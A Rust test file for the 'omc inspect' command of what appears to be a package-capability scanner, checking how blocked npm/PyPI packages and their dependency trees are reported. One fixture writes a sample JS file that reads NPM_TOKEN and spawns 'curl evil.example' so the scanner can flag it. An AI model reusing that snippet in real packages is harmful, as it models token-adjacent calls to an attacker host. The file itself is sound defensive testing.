//! Tests for `omc inspect`: the verbose capability report and the read-only
//! (never-touch-the-user's-project) guarantee. Deterministic and network-free —
//! the verbose renderer is exercised against a `LinkReport` built from a real
//! LOCAL source compile (`compile_source_path`, no registry/network), and the
//! read-only path is checked on the pre-resolution error branch so no live
//! registry is ever contacted.

use super::*;

use std::path::PathBuf;

use omc_cap::Capability;
use omc_registry::{
    compile_source_path, Behavior, CompileSourceOptions, Ecosystem, LinkReport, LockedPackage,
    Verdict,
};

use crate::inspect::{run_inspect, InspectCommand};
use crate::render::{format_inspect_report_with, format_link_report_verbose};

use omc_registry::{CapabilityFinding, CapabilityKind, OmcArtifact};

/// Compile a small JS source that reads an env var and spawns a process into a
/// real `OmcArtifact` (local, no network), then wrap it in a `LinkReport` so the
/// verbose renderer can be tested against true capability findings.
fn link_report_with_capabilities() -> LinkReport {
    let dir = test_dir("inspect-fixture-compile");
    let source = dir.join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
        source.join("index.js"),
        "const cp = require('child_process');\n\
         const token = process.env.NPM_TOKEN;\n\
         cp.execSync('curl evil.example');\n",
    )
    .unwrap();

    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.clone(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "snoop".to_owned(),
        version: "1.2.3".to_owned(),
        // No grants: env read + process spawn are denied by default, so the
        // package is Blocked and carries verifier findings — exactly the case
        // inspect must still report in full.
        allowed_capabilities: Vec::new(),
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap();
    let artifact = report.artifact;

    assert!(
        !artifact.capabilities.is_empty(),
        "fixture must produce capability findings: {artifact:?}"
    );

    let locked = LockedPackage {
        ecosystem: Ecosystem::Npm,
        name: "snoop".to_owned(),
        version: "1.2.3".to_owned(),
        source_url: artifact.source_url.clone(),
        archive: "cache/snoop-1.2.3.tgz".to_owned(),
        artifact: ".omc/artifacts/snoop-1.2.3.json".to_owned(),
        sha256: "0".repeat(64),
        artifact_sha256: String::new(),
        behavior: artifact.behavior,
        verdict: artifact.verdict,
        dependencies: artifact.dependencies.clone(),
        optional_dependencies: artifact.optional_dependencies.clone(),
        peer_dependencies: artifact.peer_dependencies.clone(),
        grants: artifact.grants.clone(),
        capabilities: artifact.capabilities.clone(),
        verifier_findings: artifact.verifier_findings.clone(),
    };

    let link_report = LinkReport {
        locked,
        artifact,
        lockfile: PathBuf::from("/scratch/omc.lock"),
        manifest: PathBuf::from("/scratch/omc.toml"),
    };
    let _ = fs::remove_dir_all(&dir);
    link_report
}

/// Build a hand-constructed `LinkReport` for a package with the given verdict,
/// capability findings, and verifier findings — no compile/network — so the
/// inspect renderer can be exercised against a controlled multi-package tree
/// that mirrors the chosen design's `requests` example.
fn link_report(
    ecosystem: Ecosystem,
    name: &str,
    version: &str,
    verdict: Verdict,
    dependencies: Vec<String>,
    capabilities: Vec<CapabilityFinding>,
    verifier_findings: Vec<String>,
) -> LinkReport {
    let behavior = if capabilities.is_empty() {
        Behavior::Pure
    } else {
        Behavior::HostCapability
    };
    let artifact = OmcArtifact {
        schema: 1,
        package: omc_registry::ArtifactPackage {
            ecosystem,
            name: name.to_owned(),
            version: version.to_owned(),
        },
        source_url: String::new(),
        source_sha256: String::new(),
        compiler: "test".to_owned(),
        microcode: omc_format::Module {
            id: String::new(),
            package: name.to_owned(),
            version: version.to_owned(),
            declared_behavior: omc_format::BehaviorType::Pure,
            functions: Vec::new(),
        },
        behavior,
        verdict,
        grants: Vec::new(),
        dependencies: dependencies.clone(),
        optional_dependencies: Vec::new(),
        peer_dependencies: Vec::new(),
        files_scanned: 0,
        capabilities: capabilities.clone(),
        verifier_findings: verifier_findings.clone(),
        signature: None,
    };
    let locked = LockedPackage {
        ecosystem,
        name: name.to_owned(),
        version: version.to_owned(),
        source_url: String::new(),
        archive: format!("cache/{name}-{version}.tgz"),
        artifact: format!(".omc/artifacts/{name}-{version}.json"),
        sha256: "0".repeat(64),
        artifact_sha256: String::new(),
        behavior,
        verdict,
        dependencies,
        optional_dependencies: Vec::new(),
        peer_dependencies: Vec::new(),
        grants: Vec::new(),
        capabilities,
        verifier_findings,
    };
    LinkReport {
        locked,
        artifact,
        lockfile: PathBuf::from("/scratch/omc.lock"),
        manifest: PathBuf::from("/scratch/omc.toml"),
    }
}

fn cap(kind: CapabilityKind, source: &str, evidence: &str) -> CapabilityFinding {
    CapabilityFinding {
        kind,
        target: "*".to_owned(),
        source: source.to_owned(),
        evidence: evidence.to_owned(),
    }
}

/// The `requests`-shaped tree from the chosen design: a blocked root with three
/// blocked deps (one with a unique fs.write reason, one network-flow dep) and
/// two accepted benign deps. Exercises every retention rule of the renderer.
fn requests_tree() -> Vec<LinkReport> {
    let root = link_report(
        Ecosystem::Pypi,
        "requests",
        "2.32.5",
        Verdict::Blocked,
        vec![
            "pypi:charset-normalizer@<4,>=2".to_owned(),
            "pypi:idna@<4,>=2.5".to_owned(),
            "pypi:urllib3@<3,>=1.21.1".to_owned(),
            "pypi:certifi@>=2017.4.17".to_owned(),
        ],
        vec![
            cap(
                CapabilityKind::HttpRequest,
                "requests/__init__.py",
                "request call",
            ),
            cap(
                CapabilityKind::HttpRequest,
                "requests/api.py",
                "request call",
            ),
            cap(
                CapabilityKind::HttpRequest,
                "requests/models.py",
                "request call",
            ),
            cap(
                CapabilityKind::EnvRead,
                "requests/sessions.py",
                "os.environ",
            ),
            cap(CapabilityKind::EnvRead, "requests/utils.py", "os.environ"),
            cap(
                CapabilityKind::DynamicEval,
                "requests/adapters.py",
                "indirect `require` via alias — cannot verify required module",
            ),
            cap(
                CapabilityKind::DynamicEval,
                "requests/packages.py",
                "opaque globals()/locals() subscript access — cannot verify",
            ),
        ],
        vec![
            "package_init[0]: env:* may not flow to network:*".to_owned(),
            "package_init[1]: capability dynamic.eval not granted".to_owned(),
            "package_init[2]: env:* may not flow to dynamic_eval".to_owned(),
        ],
    );
    let charset = link_report(
        Ecosystem::Pypi,
        "charset-normalizer",
        "3.4.7",
        Verdict::Blocked,
        Vec::new(),
        vec![
            cap(
                CapabilityKind::FsRead,
                "charset_normalizer/api.py",
                "open()",
            ),
            cap(
                CapabilityKind::FsWrite,
                "charset_normalizer/utils.py",
                "open(w)",
            ),
            cap(
                CapabilityKind::DynamicEval,
                "charset_normalizer/md.py",
                "opaque dynamic import (computed target) — cannot verify",
            ),
        ],
        vec![
            "package_init[0]: capability fs.write:* not granted".to_owned(),
            "package_init[1]: capability dynamic.eval not granted".to_owned(),
        ],
    );
    let idna = link_report(
        Ecosystem::Pypi,
        "idna",
        "3.18",
        Verdict::Accepted,
        Vec::new(),
        Vec::new(),
        Vec::new(),
    );
    let urllib3 = link_report(
        Ecosystem::Pypi,
        "urllib3",
        "2.6.3",
        Verdict::Blocked,
        Vec::new(),
        vec![
            cap(
                CapabilityKind::HttpRequest,
                "urllib3/connectionpool.py",
                "request",
            ),
            cap(
                CapabilityKind::EnvRead,
                "urllib3/util/ssl_.py",
                "os.environ",
            ),
            cap(CapabilityKind::FsRead, "urllib3/connection.py", "open()"),
            cap(CapabilityKind::FsRead, "urllib3/response.py", "open()"),
        ],
        vec![
            "package_init[0]: env:* may not flow to network:*".to_owned(),
            "package_init[1]: file:* may not flow to network:*".to_owned(),
        ],
    );
    let certifi = link_report(
        Ecosystem::Pypi,
        "certifi",
        "2026.5.20",
        Verdict::Accepted,
        Vec::new(),
        Vec::new(),
        Vec::new(),
    );
    vec![root, charset, idna, urllib3, certifi]
}

#[test]
fn inspect_report_keeps_every_capability_file_and_block_reason() {
    let report = link_report_with_capabilities();
    let one = std::slice::from_ref(&report);
    let compact = format_inspect_report_with(one, false);
    let full = format_inspect_report_with(one, true);

    // Banner names the package, ecosystem-qualified, with the blocked verdict.
    assert!(
        compact.contains("npm:snoop@1.2.3"),
        "banner is ecosystem-qualified: {compact}"
    );
    assert!(
        compact.contains("BLOCKED"),
        "banner shows verdict: {compact}"
    );

    // Compact default RETAINS every capability finding's SOURCE FILE (grouped,
    // not truncated) — that is inspect's reason to exist.
    assert_eq!(report.locked.verdict, Verdict::Blocked);
    for finding in &report.artifact.capabilities {
        assert!(
            compact.contains(&finding.source),
            "capability source file {} present in compact: {compact}",
            finding.source
        );
    }
    // ...plus grouped review bullets and a pointer to the guided approval view.
    assert!(
        compact.contains("Why OMC stopped it:"),
        "compact shows review bullets: {compact}"
    );
    assert!(
        compact.contains("omc inspect npm:snoop@1.2.3 -v"),
        "compact points to guided approval details: {compact}"
    );
    assert!(
        !compact.contains("omc trust npm:snoop@1.2.3"),
        "compact hides the trust grant dump: {compact}"
    );
    // Compact stays terse: no per-finding callout block, no run-once dump.
    assert!(
        !compact.contains("Blocked because it wants to:"),
        "compact omits the per-finding callouts: {compact}"
    );
    assert!(
        !compact.contains("omc add npm:snoop@1.2.3"),
        "compact omits the run-once grant dump: {compact}"
    );

    // --verbose restores the full per-finding data as tables plus the guided
    // approval choices and the policy statements they would persist.
    assert!(
        full.contains("Policy violations:") && full.contains("source/capability"),
        "verbose shows the policy violation table: {full}"
    );
    assert!(
        full.contains("Guided approval:") && full.contains("command / choice"),
        "verbose shows the guided approval table: {full}"
    );
    assert!(
        full.contains("omc add npm:snoop@1.2.3"),
        "verbose points to the guided add flow: {full}"
    );
    assert!(
        full.contains("[y]") && full.contains("[a]") && full.contains("[N]"),
        "verbose shows the once/always/deny choices: {full}"
    );
    assert!(
        full.contains("Policy preview:") && full.contains("statement"),
        "verbose shows the policy preview table: {full}"
    );
    assert!(
        !full.contains("omc trust npm:snoop@1.2.3"),
        "verbose omits the old trust command dump: {full}"
    );
}

#[test]
fn inspect_report_renders_full_tree_with_grouped_caps_and_grants() {
    let reports = requests_tree();
    let r = format_inspect_report_with(&reports, false); // compact default
    let v = format_inspect_report_with(&reports, true); // --verbose

    // Banner + dep count + top risk (env->network + eval on the root).
    assert!(r.contains("pypi:requests@2.32.5"), "banner: {r}");
    assert!(r.contains("+4 deps"), "dep count in banner: {r}");
    assert!(
        r.contains("Top risk:") && r.contains("environment variables to the network"),
        "top risk sentence present: {r}"
    );

    // Blocked count lives in the headline (no separate verdict row), and the
    // aggregate capability surface is summarized.
    assert!(
        r.contains("3 of 5 packages are blocked"),
        "blocked count in headline: {r}"
    );
    assert!(
        r.contains("Capability surface:"),
        "capability surface line: {r}"
    );

    // Every resolved package is a tree row with its pinned version + glyph —
    // including the accepted benign deps (nothing in the tree disappears).
    for (name, version) in [
        ("requests", "2.32.5"),
        ("charset-normalizer", "3.4.7"),
        ("idna", "3.18"),
        ("urllib3", "2.6.3"),
        ("certifi", "2026.5.20"),
    ] {
        assert!(
            r.contains(name) && r.contains(version),
            "tree row for {name} {version}: {r}"
        );
    }
    assert!(
        r.contains("no host access"),
        "accepted benign deps show no host access: {r}"
    );

    // Relation headers reconstruct root -> deps.
    assert!(r.contains("(root)"), "root relation header: {r}");
    assert!(r.contains("(dep of requests)"), "dep relation header: {r}");

    // COMPACT RETAINS every capability source file (grouped/comma-joined, or in
    // the unverifiable-code site line) — no file is lost in the default view.
    for src in [
        "requests/__init__.py",
        "requests/api.py",
        "requests/models.py",
        "requests/sessions.py",
        "requests/utils.py",
        "charset_normalizer/api.py",
        "charset_normalizer/utils.py",
        "urllib3/connectionpool.py",
        "urllib3/util/ssl_.py",
        "urllib3/connection.py",
        "urllib3/response.py",
    ] {
        assert!(
            r.contains(src),
            "capability source {src} retained in compact: {r}"
        );
    }

    // Compact grouped reasons cover the notable dangers, and policy details are
    // only pointed to via -v; the package_init[N] index is never surfaced.
    assert!(
        r.contains("can send environment values to the network"),
        "compact reason env->network: {r}"
    );
    assert!(
        r.contains("can write files"),
        "compact reason fs.write: {r}"
    );
    assert!(
        r.contains("omc inspect pypi:requests@2.32.5 -v"),
        "compact guided approval pointer (requests): {r}"
    );
    assert!(
        r.contains("omc inspect pypi:charset-normalizer@3.4.7 -v"),
        "compact guided approval pointer (charset): {r}"
    );
    assert!(
        !r.contains("omc trust pypi:requests@2.32.5"),
        "compact hides trust grant dump: {r}"
    );
    assert!(
        !r.contains("package_init["),
        "package_init[N] index never surfaced: {r}"
    );
    // Compact omits the per-finding callouts + run-once dump.
    assert!(
        !r.contains("Blocked because it wants to:"),
        "compact omits per-finding callouts: {r}"
    );
    assert!(
        !r.contains("omc add pypi:requests"),
        "compact omits run-once grant dump: {r}"
    );

    // --verbose restores eval evidence verbatim, full violation rows, guided
    // approval, and the policy DSL preview.
    assert!(
        v.contains("indirect `require` via alias — cannot verify required module"),
        "verbose eval evidence retained: {v}"
    );
    assert!(
        v.contains("fs.write") && v.contains("persistent write"),
        "verbose charset fs.write row: {v}"
    );
    assert!(
        v.contains("file:*") && v.contains("network:*"),
        "verbose urllib3 file->network row: {v}"
    );
    assert!(
        v.contains("source/capability") && v.contains("sink/target"),
        "verbose table columns: {v}"
    );
    assert!(
        v.contains("Policy violations:"),
        "verbose per-finding table: {v}"
    );
    assert!(
        v.contains("omc add pypi:requests@2.32.5"),
        "verbose guided add pointer (requests): {v}"
    );
    assert!(
        v.contains("--allow-flow env:*->network:*"),
        "flow grant token remains auditable in the violation table: {v}"
    );
    assert!(
        v.contains("--allow dynamic.eval"),
        "capability grant token remains auditable in the violation table: {v}"
    );
    assert!(
        v.contains("--allow fs.write"),
        "charset fs.write grant token remains auditable: {v}"
    );
    assert!(
        v.contains("Policy preview:") && v.contains("flow env \"*\" -> net \"*\""),
        "policy preview contains the flow DSL: {v}"
    );
    assert!(
        v.contains("allow eval") && v.contains("allow write \"*\""),
        "policy preview contains capability DSL: {v}"
    );
    assert!(
        !v.contains("omc trust pypi:requests@2.32.5"),
        "verbose omits the old trust command dump: {v}"
    );
}

#[test]
fn inspect_report_marks_tree_blocked_when_dependency_blocks() {
    let root = link_report(
        Ecosystem::Npm,
        "client",
        "1.0.0",
        Verdict::Accepted,
        vec!["npm:helper@1.0.0".to_owned()],
        vec![cap(CapabilityKind::HttpRequest, "index.js", "fetch")],
        Vec::new(),
    );
    let dep = link_report(
        Ecosystem::Npm,
        "helper",
        "1.0.0",
        Verdict::Blocked,
        Vec::new(),
        vec![cap(CapabilityKind::FsWrite, "postinstall.js", "writeFile")],
        vec!["package_init[0]: capability fs.write:* not granted".to_owned()],
    );
    let rendered = format_inspect_report_with(&[root, dep], false);

    assert!(
        rendered.contains("✗ npm:client@1.0.0  BLOCKED"),
        "banner must reflect the whole install tree: {rendered}"
    );
    assert!(
        rendered.contains("1 of 2 packages is blocked"),
        "blocked dependency count present: {rendered}"
    );
    assert!(
        rendered.contains("client 1.0.0") && rendered.contains("✓ accepted"),
        "root row keeps its package-level accepted verdict: {rendered}"
    );
    assert!(
        rendered.contains("helper 1.0.0") && rendered.contains("✗ blocked"),
        "dependency row keeps its package-level blocked verdict: {rendered}"
    );
    assert!(
        !rendered.contains("npm:client@1.0.0  OK"),
        "blocked tree must not be labeled OK: {rendered}"
    );
}

#[test]
fn add_v_raw_dump_is_unchanged() {
    // `omc add -v` still uses the raw per-package dump verbatim — the redesign is
    // inspect-only. This pins that the raw dump keeps its archive/artifact/
    // capabilities/verifier-findings shape.
    let report = link_report_with_capabilities();
    let rendered = format_link_report_verbose(&report);
    assert!(rendered.contains("npm:snoop@1.2.3"));
    assert!(rendered.contains("archive"));
    assert!(rendered.contains("artifact"));
    assert!(rendered.contains("capabilities:"));
    assert!(rendered.contains("verifier findings:"));
}

#[test]
fn behavior_label_round_trips() {
    // Sanity that the constructed report uses host-capability behavior (it reads
    // env + spawns) and the renderer therefore exercises the non-pure path.
    let report = link_report_with_capabilities();
    assert!(matches!(report.locked.behavior, Behavior::HostCapability));
    let _ = Capability::FsRead("*".to_owned()); // ensure omc_cap is linked in test scope
}

/// READ-ONLY guarantee: an inspect invocation that fails before any registry
/// resolution (here, an unparseable spec) must not create `omc.lock` or
/// `node_modules` in the user's current working directory. This exercises the
/// no-write contract without contacting the network.
#[test]
fn inspect_never_writes_into_cwd_on_error_path() {
    let cwd = test_dir("inspect-cwd-untouched");
    // A spec with an unknown ecosystem prefix fails in parse_package_specs,
    // before any temp dir or network work.
    let result = with_env_lock(|| {
        let previous = env::current_dir().ok();
        env::set_current_dir(&cwd).unwrap();
        let result = run_inspect(InspectCommand {
            npm: false,
            pypi: false,
            specs: vec!["bogus-ecosystem:not-a-real-thing@9.9.9".to_owned()],
            allow: Vec::new(),
            allow_flow: Vec::new(),
            allow_all_host: false,
        });
        if let Some(previous) = previous {
            let _ = env::set_current_dir(previous);
        }
        result
    });

    assert!(
        result.is_err(),
        "an unparseable spec must error, not resolve"
    );
    assert!(
        !cwd.join("omc.lock").exists(),
        "inspect must not write omc.lock into the cwd"
    );
    assert!(
        !cwd.join("omc.toml").exists(),
        "inspect must not write omc.toml into the cwd"
    );
    assert!(
        !cwd.join("node_modules").exists(),
        "inspect must not create node_modules in the cwd"
    );

    let _ = fs::remove_dir_all(&cwd);
}
